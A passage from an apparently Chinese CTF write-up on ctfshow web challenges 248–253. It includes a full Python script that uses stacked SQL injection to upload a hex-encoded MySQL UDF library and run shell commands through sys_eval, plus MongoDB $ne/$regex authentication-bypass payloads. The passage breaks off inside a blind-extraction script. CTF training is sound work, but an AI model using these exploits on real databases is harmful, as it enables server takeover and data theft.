class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#参考脚本</span><br><span class="line">#环境：Linux<span class="operator">/</span>MariaDB</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url<span class="operator">=</span><span class="string">&#x27;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code<span class="operator">=</span><span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes<span class="operator">=</span>[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>,len(code),<span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i<span class="operator">+</span><span class="number">128</span>,len(code))])</span><br><span class="line"> </span><br><span class="line">#建临时表</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#清空临时表</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#插入第一段数据</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.format(codes[<span class="number">0</span>])</span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#更新连接剩余数据</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,len(codes)):</span><br><span class="line">    <span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.format(codes[k])</span><br><span class="line">    payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">    requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#<span class="number">10.3</span><span class="number">.18</span><span class="operator">-</span>MariaDB    </span><br><span class="line">#写入so文件</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;</span><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mariadb<span class="operator">/</span>plugin<span class="operator">/</span>udf.so\<span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#引入自定义函数</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;</span>udf.so\<span class="string">&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#命令执行，结果更新到界面</span><br><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;</span>cat <span class="operator">/</span>flag.her?<span class="string">&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload<span class="operator">=</span><span class="string">&#x27;&#x27;&#x27;0&#x27;</span>;&#123;&#125;;<span class="comment">-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line">requests.get(url<span class="operator">+</span>payload)</span><br><span class="line"> </span><br><span class="line">#查看结果</span><br><span class="line">r<span class="operator">=</span>requests.get(url[:<span class="number">-4</span>]<span class="operator">+</span><span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><blockquote>
<p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/609">http://rui0.cn/archives/609</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a><br><a target="_blank" rel="noopener" href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</a></p>
</blockquote>
<h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">user</span> <span class="operator">=</span> $memcache<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">get</span>($id);</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id[]<span class="operator">=</span>flag</span><br></pre></td></tr></table></figure>
<h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  $query <span class="operator">=</span> <span class="keyword">new</span> MongoDB\Driver\Query($data);</span><br><span class="line">  $<span class="keyword">cursor</span> <span class="operator">=</span> $manager<span class="operator">-</span><span class="operator">&gt;</span>executeQuery(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, $query)<span class="operator">-</span><span class="operator">&gt;</span>toArray();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>无过滤</span><br><span class="line">  if(<span class="built_in">count</span>($<span class="keyword">cursor</span>)<span class="operator">&gt;</span><span class="number">0</span>)&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    array_push($ret[<span class="string">&#x27;data&#x27;</span>], $flag);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>有的时候服务器会摆，重启一下试试</p>
<h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p>post传入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>.<span class="operator">*</span><span class="operator">&amp;</span>password[$regex]<span class="operator">=</span>.<span class="operator">*</span></span><br></pre></td></tr></table></figure>
<h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>f.<span class="operator">*</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559031690-d2869572-b4e7-4998-82b0-ac7e4a1077cc.png" alt="image.png"></p>
<h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p>这里直接用别人的脚本了：<br>道理是相同的，一点点猜即可。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">-- coding:UTF-8 --</span></span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># <span class="type">Date</span>:<span class="number">2021</span><span class="operator">/</span><span class="number">8</span><span class="operator">/</span><span class="number">4</span></span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080/api/&quot;</span><br><span class="line">str <span class="operator">=</span> &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span><br><span class="line">flag <span class="operator">=</span> &quot;&quot;</span><br><span class="line"></span><br><span class="line">payload_user <span class="operator">=</span> &quot;flag.*&quot;</span><br><span class="line">payload_pass <span class="operator">=</span> &quot;^&#123;&#125;.*&quot;</span><br><span class="line"></span><br><span class="line">n <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span 